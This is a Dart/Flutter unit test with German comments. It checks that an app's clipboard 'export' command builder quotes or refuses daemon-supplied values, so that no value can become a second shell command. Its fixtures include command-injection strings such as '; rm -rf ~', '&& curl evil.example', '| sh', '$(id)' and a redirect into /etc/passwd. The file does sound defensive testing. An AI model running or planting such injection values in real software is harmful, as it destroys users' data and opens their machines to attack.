// Der eine Weg von einem fremden Wert in eine Shell (HUM-106, Befund des
// Reviews vom 2026-09-05).
//
// `FixAction.setEnv` kommt über die Leitung, und die Karte legt daraus einen
// Befehl in die Zwischenablage. Interpoliert man ihn, ist jeder Wert mit `;`,
// `&&`, `|`, Backtick, `$(…)` oder einem Zeilenumbruch ein zweiter Befehl auf
// dem Rechner des Nutzers.
//
// Die Regel, die hier geprüft wird, ist die des Daemons für seine eigenen
// Kommandozeilen (`humanitl_sandbox::shell_quote`): Ein Befehl entsteht nur,
// wenn er beweisbar genau das ist, was er zu sein vorgibt. Die Zusicherung
// heißt deshalb nicht „der Wert ist gequotet", sondern **eine Shell zerlegt
// die Zeile in genau drei Wörter**: `export`, die Zuweisung, sonst nichts.
// Eine Prüfung auf die Schreibweise wäre eine Prüfung der Regel und nicht der
// Sicherheit; sie bliebe grün, sobald jemand anders quotet und dabei ein Loch
// lässt.

import 'package:flutter_test/flutter_test.dart';
import 'package:humanitl/core/ui/shell_command.dart';

/// Zerlegt [line] so, wie `sh` es täte, und wirft, wo `sh` mehr als ein
/// Kommando sähe.
///
/// Eine bewusst kleine Shell: Wörter trennen sich an Leerraum, einfache
/// Anführungszeichen schützen alles bis zum nächsten einfachen
/// Anführungszeichen, und jedes Steuerzeichen, das ein Kommando beenden oder
/// verketten könnte, ist außerhalb der Anführungszeichen ein Fehler. Genau
/// diese Zeichen darf ein gebauter Befehl nicht ungeschützt tragen.
List<String> shellWords(String line) {
  const String metacharacters =
      r';&|<>()`$*?[]#~!{}'
      '\n\r';
  final List<String> words = <String>[];
  final StringBuffer word = StringBuffer();
  bool started = false;
  bool quoted = false;
  for (int i = 0; i < line.length; i++) {
    final String c = line[i];
    if (quoted) {
      if (c == "'") {
        quoted = false;
      } else {
        word.write(c);
      }
      continue;
    }
    if (c == "'") {
      quoted = true;
      started = true;
      continue;
    }
    if (c == r'\' && i + 1 < line.length) {
      word.write(line[i + 1]);
      started = true;
      i++;
      continue;
    }
    if (c == ' ' || c == '\t') {
      if (started) {
        words.add(word.toString());
        word.clear();
        started = false;
      }
      continue;
    }
    if (metacharacters.contains(c)) {
      throw StateError('unquoted shell metacharacter $c in: $line');
    }
    word.write(c);
    started = true;
  }
  if (quoted) {
    throw StateError('unterminated quote in: $line');
  }
  if (started) {
    words.add(word.toString());
  }
  return words;
}

void main() {
  // Jeder Wert, den ein Angreifer schriebe, wenn er die Zwischenablage des
  // Nutzers erreichen wollte.
  const Map<String, String> hostile = <String, String>{
    'semicolon': '/etc/ca.crt; rm -rf ~',
    'and': '/etc/ca.crt && curl evil.example',
    'pipe': '/etc/ca.crt | sh',
    'backtick': r'`id`',
    'substitution': r'$(id)',
    'variable': r'$HOME/ca.crt',
    'single quote': "a'; rm -rf ~; '",
    'space': '/etc/my ca.crt',
    'tab': '/etc/ca\tcrt',
    'glob': '/etc/*.crt',
    'brace': '/etc/{a,b}.crt',
    'comma': '/etc/a,b.crt',
    'percent': '/etc/100%.crt',
    'hash': '/etc/ca.crt#comment',
    'bang': '/etc/!42.crt',
    'redirect': '/etc/ca.crt > /etc/passwd',
    'double quote': 'a" ; rm -rf ~ ; "',
    'backslash': r'/etc/ca\ crt',
    'newline': '/etc/ca.crt\nrm -rf ~',
    'carriage return': '/etc/ca.crt\rrm -rf ~',
    'both': '/etc/ca.crt\r\nrm -rf ~',
  };

  group('a value never becomes a second command', () {
    hostile.forEach((String name, String value) {
      test(name, () {
        final String? command = exportCommand(
          key: 'CURL_CA_BUNDLE',
          value: value,
        );
        if (command == null) {
          // Verweigert wird nur, was sich nicht in eine Zeile fassen lässt.
          expect(
            value.contains('\n') || value.contains('\r'),
            isTrue,
            reason: '$name was refused without a line break',
          );
          return;
        }
        // Genau drei Wörter, und das dritte ist wieder der Wert, den der
        // Daemon geschickt hat. Rot, sobald jemand die Quotierung entfernt.
        expect(shellWords(command), <String>[
          'export',
          'CURL_CA_BUNDLE=$value',
        ], reason: name);
      });
    });
  });

  test('a harmless value stays readable', () {
    expect(
      exportCommand(key: 'CURL_CA_BUNDLE', value: '/etc/humanitl/ca.crt'),
      'export CURL_CA_BUNDLE=/etc/humanitl/ca.crt',
    );
    expect(shellWords('export CURL_CA_BUNDLE=/etc/humanitl/ca.crt'), <String>[
      'export',
      'CURL_CA_BUNDLE=/etc/humanitl/ca.crt',
    ]);
  });

  test('an empty value is quoted, not dropped', () {
    // Ohne Anführungszeichen stünde dort `export K=` — das löscht die
    // Variable in manchen Shells, statt sie leer zu setzen.
    expect(exportCommand(key: 'K', value: ''), "export K=''");
    expect(shellWords("export K=''"), <String>['export', 'K=']);
  });

  group('a key that is no shell name yields no command', () {
    for (final String key in <String>[
      '',
      '1CURL',
      'CURL-CA',
      'CURL CA',
      'CURL;rm -rf ~',
      r'CURL$X',
      'CURL\nPATH',
      'CÜRL',
    ]) {
      test(key.isEmpty ? '(empty)' : key, () {
        // Kein Ersatzschlüssel, kein Platzhalter: gar kein Befehl.
        expect(exportCommand(key: key, value: '/etc/ca.crt'), isNull);
        expect(
          exportRefusal(key: key, value: '/etc/ca.crt'),
          ExportRefusal.key,
        );
      });
    }
  });

  test('a line break is refused rather than quoted', () {
    // Quotieren allein genügte hier nicht: Ein Terminal ohne
    // Klammer-Einfügen schickt die erste Zeile ab, bevor der Mensch die
    // zweite gelesen hat.
    expect(exportRefusal(key: 'K', value: 'a\nb'), ExportRefusal.value);
    expect(exportRefusal(key: 'K', value: 'a\rb'), ExportRefusal.value);
    expect(exportRefusal(key: 'K', value: 'a\tb'), isNull);
  });

  test('the tilde is quoted, because a shell would expand it', () {
    // `export K=~/x` setzte den Pfad des Heimatverzeichnisses, nicht die
    // Zeichenkette, die auf dem Schirm steht.
    expect(exportCommand(key: 'K', value: '~/ca.crt'), "export K='~/ca.crt'");
    expect(shellWords("export K='~/ca.crt'"), <String>['export', 'K=~/ca.crt']);
  });

  test('the bare set stays inside what a shell reads literally', () {
    // Die unbedenkliche Menge steht hier noch einmal, unabhaengig von der
    // Umsetzung. Sie ist die Zusicherung: Wer `_isSafe` um ein Komma, ein
    // Prozent, eine Tilde oder sonst etwas erweitert, macht diesen Test rot,
    // auch wenn die Mini-Shell das Zeichen fuer harmlos haelt.
    const String literal =
        'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        'abcdefghijklmnopqrstuvwxyz'
        '0123456789'
        '/._-+:@';
    for (int code = 0x20; code <= 0x7E; code++) {
      final String char = String.fromCharCode(code);
      final String quoted = shellQuote(char);
      if (literal.contains(char)) {
        expect(quoted, char, reason: 'U+${code.toRadixString(16)} $char');
      } else {
        expect(
          quoted.startsWith("'"),
          isTrue,
          reason: 'U+${code.toRadixString(16)} $char was left bare',
        );
      }
    }
  });

  test(
    'a word of several safe characters stays bare, one bad one quotes it',
    () {
      expect(shellQuote('a-b_c.d/e:f@g+h'), 'a-b_c.d/e:f@g+h');
      expect(shellQuote('a-b_c.d,e'), "'a-b_c.d,e'");
    },
  );
}
